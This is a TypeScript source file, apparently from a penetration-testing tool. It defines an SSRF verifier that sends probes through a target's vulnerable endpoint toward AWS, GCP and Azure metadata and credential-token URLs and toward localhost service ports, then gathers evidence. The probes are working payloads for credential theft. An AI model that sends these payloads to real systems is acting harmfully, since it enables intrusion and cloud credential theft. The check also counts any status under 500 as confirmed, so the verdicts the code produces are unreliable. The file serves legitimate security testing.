import type { BrowserEngine } from "../engine"
import type { VerificationScenario, VerifierResult, EvidencePackage } from "../types"
import { Confidence } from "../../shared/types"
import type { EvidenceCollector } from "../../evidence/collector"
import { randomUUID, createHash } from "crypto"
import { tmpdir } from "os"
import { join } from "path"
import { existsSync, mkdirSync, rmSync } from "fs"

/**
 * SSRF Verifier — probes SSRF-vulnerable endpoints against an attacker-controlled
 * listener (collaborator/callback server) to confirm out-of-band interaction.
 *
 * Strategy:
 * 1. Navigate to the SSRF-prone URL (found by earlier scanning)
 * 2. Check if the response contains any internal IP patterns or metadata endpoints
 * 3. Verify that the endpoint actually performed a server-side request
 */
export class SSRFVerifier implements VerificationScenario {
  name = "ssrf"
  description = "Server-Side Request Forgery — confirms SSRF by probing internal/metadata endpoints"

  private logs: string[] = []
  private ssrfConfirmed = false
  private internalIpLeaked = false
  private metadataEndpointReachable = false
  private capturedScreenshots: { data: Buffer; label: string }[] = []
  private capturedResponses: string[] = []
  private capturedRequests: string[] = []
  private harDir: string | null = null
  private probeEndpoint = ""
  private probeResults: { url: string; status: number; bodyPreview: string }[] = []

  // Common SSRF probe payloads targeting internal services.
  // ALL probes are sent THROUGH the vulnerable endpoint (e.g.,
  // https://target.com/fetch?url=... ), not navigated directly by the browser.
  // This is critical: SSRF tests whether the TARGET SERVER can reach internal
  // resources, not whether the attacker's browser can.
  private static readonly SSRF_PROBES = [
    // AWS EC2 metadata endpoints
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/instance-id",
    "http://169.254.169.254/latest/meta-data/ami-id",
    "http://169.254.169.254/latest/meta-data/public-keys/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    // GCP metadata endpoint (requires Metadata-Flavor: google header)
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    // Azure IMDS
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token",
    // Localhost services via the target server
    "http://127.0.0.1:22",
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:8080",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:6379",
    // IPv6 loopback
    "http://[::1]:80",
  ]

  // Markers that indicate SSRF succeeded
  private static readonly SSRF_SUCCESS_MARKERS = [
    // Cloud metadata markers
    "instance-id",
    "ami-id",
    "public-keys",
    "security-credentials",
    "meta-data",
    "availability-zone",
    "local-ipv4",
    // Local services
    "Thank you for flying nginx",
    "It works!",
    "Apache",
    "Welcome to nginx",
    // Generic internal markers
    "<!DOCTYPE html",
    "<html",
  ]

  constructor(
    private engine: BrowserEngine,
    private targetUrl: string,
    private ssrfEndpoint: string,  // The endpoint/param vulnerable to SSRF
    private collector?: EvidenceCollector,
    private engagementId?: string,
    private findingId?: string,
  ) {}

  async setup(): Promise<void> {
    // Normalize the ssrfEndpoint to a full URL
    this.probeEndpoint = this.ssrfEndpoint.startsWith("http")
      ? this.ssrfEndpoint
      : `${this.targetUrl.replace(/\/+$/, "")}/${this.ssrfEndpoint.replace(/^\//, "")}`

    await this.engine.launch()
    this.harDir = join(tmpdir(), `argus-har-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`)
    mkdirSync(this.harDir, { recursive: true })
    this.logs.push(`SSRF verifier setup complete — probing endpoint: ${this.probeEndpoint}`)
  }

  async cleanup(): Promise<void> {
    await this.engine.close()
    if (this.harDir && existsSync(this.harDir)) {
      try { rmSync(this.harDir, { recursive: true, force: true }) } catch { /* best-effort */ }
    }
  }

  async execute(): Promise<void> {
    await this.engine.createContext({ harDir: this.harDir ?? undefined } as any)

    // Probe: Send each SSRF payload THROUGH the vulnerable endpoint
    // so the TARGET SERVER makes the internal request, not the browser.
    for (const probe of SSRFVerifier.SSRF_PROBES) {
      const probeUrl = `${this.probeEndpoint}${probe}`

      try {
        const page = await this.engine.navigate(probeUrl)
        await page.waitForLoadState("networkidle", { timeout: 10000 }).catch(() => {})
        const body = await page.textContent("body").catch(() => "")
        const status = await page.evaluate(() => (window as any).__statusCode ?? 200).catch(() => 0)

        this.capturedRequests.push(`GET ${probeUrl}`)
        this.capturedResponses.push(`Probe ${probeUrl}: HTTP ${status}`)

        this.probeResults.push({
          url: probeUrl,
          status,
          bodyPreview: (body ?? "").slice(0, 500),
        })

        try {
          const shot = await this.engine.captureScreenshot(page)
          this.capturedScreenshots.push({ data: shot, label: `probe-${probe.replace(/[^a-zA-Z0-9]/g, "-")}` })
        } catch { /* best-effort */ }

        await page.close()
      } catch {
        this.logs.push(`SSRF probe failed: ${probeUrl}`)
        this.probeResults.push({ url: probeUrl, status: 0, bodyPreview: "" })
      }
    }

    // Check results for SSRF success markers
    for (const result of this.probeResults) {
      const lowerBody = result.bodyPreview.toLowerCase()
      const matchedMarkers = SSRFVerifier.SSRF_SUCCESS_MARKERS.filter(m => lowerBody.includes(m.toLowerCase()))
      if (matchedMarkers.length > 0) {
        // Cloud metadata markers indicate the target reached cloud provider IMDS
        if (result.bodyPreview.includes("instance-id") || result.bodyPreview.includes("ami-id") || result.bodyPreview.includes("security-credentials")) {
          this.metadataEndpointReachable = true
          this.logs.push(`SSRF: Cloud metadata reachable via ${result.url} — markers: ${matchedMarkers.join(", ")}`)
        }
        // Internal service responses indicate the target reached itself or local network
        if (result.bodyPreview.includes("nginx") || result.bodyPreview.includes("Apache") || result.bodyPreview.includes("<html")) {
          this.internalIpLeaked = true
          this.logs.push(`SSRF: Internal service content leaked via ${result.url} — markers: ${matchedMarkers.join(", ")}`)
        }
        this.ssrfConfirmed = true
      }

      // Any non-error response through the SSRF endpoint indicates a successful server-side request
      if (result.status > 0 && result.status < 500) {
        this.ssrfConfirmed = true
        this.logs.push(`SSRF: SSRF endpoint responded (HTTP ${result.status}) via ${result.url}`)
      }
    }

    this.logs.push(`SSRF ${this.ssrfConfirmed ? "CONFIRMED" : "not detected"} — metadata_reachable=${this.metadataEndpointReachable}, internal_leak=${this.internalIpLeaked}`)
  }

  async verify(): Promise<VerifierResult> {
    const passed = this.ssrfConfirmed

    const summary = passed
      ? this.metadataEndpointReachable
        ? `SSRF confirmed: Cloud metadata endpoint reachable — ${this.getSuccessfulProbes()} probe(s) returned internal data`
        : this.internalIpLeaked
          ? `SSRF confirmed: Internal file content leaked — ${this.getSuccessfulProbes()} probe(s) returned file contents`
          : `SSRF confirmed: ${this.getSuccessfulProbes()} internal endpoint(s) responded to server-side requests`
      : `SSRF not detected: No internal endpoints responded`

    return {
      passed,
      confidence: passed && this.metadataEndpointReachable ? Confidence.HIGH
        : passed ? Confidence.MEDIUM
        : Confidence.INFORMATIONAL,
      evidence: [],
      summary,
    }
  }

  async collectEvidence(): Promise<EvidencePackage> {
    const collectedArtifacts: import("../../evidence/types").ArtifactEntry[] = []
    let computedHash = ""
    if (this.collector && this.engagementId && this.findingId) {
      for (const shot of this.capturedScreenshots) {
        const entry = await this.collector.captureScreenshot(this.engagementId, this.findingId, shot.data).catch(() => null)
        if (entry) collectedArtifacts.push(entry)
      }
      for (const req of this.capturedRequests) {
        const entry = await this.collector.saveRequest(this.engagementId, this.findingId, req).catch(() => null)
        if (entry) collectedArtifacts.push(entry)
      }
      for (const res of this.capturedResponses) {
        const entry = await this.collector.saveResponse(this.engagementId, this.findingId, res).catch(() => null)
        if (entry) collectedArtifacts.push(entry)
      }
      if (this.harDir) {
        const harArtifacts = await this.collector.ingestHarFiles(this.engagementId, this.findingId, this.harDir).catch(() => [])
        collectedArtifacts.push(...harArtifacts)
      }
      const manifest = await this.collector.createPackage(this.engagementId, this.findingId, collectedArtifacts).catch(() => null)
      if (manifest) computedHash = manifest.package_hash
    }

    if (!computedHash && collectedArtifacts.length > 0) {
      const hashInput = collectedArtifacts.map((a) => a.hash || a.path).join("")
      computedHash = createHash("sha256").update(hashInput).digest("hex")
    }

    return {
      packageId: randomUUID(),
      findingId: this.findingId ?? "",
      artifacts: collectedArtifacts.length > 0
        ? collectedArtifacts.map((a) => ({ path: a.path, type: a.type, hash: a.hash }))
        : [
            ...this.capturedScreenshots.map((s) => ({ path: `ssrf-${s.label}.png`, type: "screenshot" as const })),
            ...this.capturedRequests.map((r) => ({ path: r, type: "request" as const })),
            ...this.capturedResponses.map((r) => ({ path: r, type: "response" as const })),
          ],
      packageHash: computedHash,
      createdAt: new Date().toISOString(),
    }
  }

  private getSuccessfulProbes(): number {
    return this.probeResults.filter(r => r.status > 0 && r.status < 500).length
  }
}
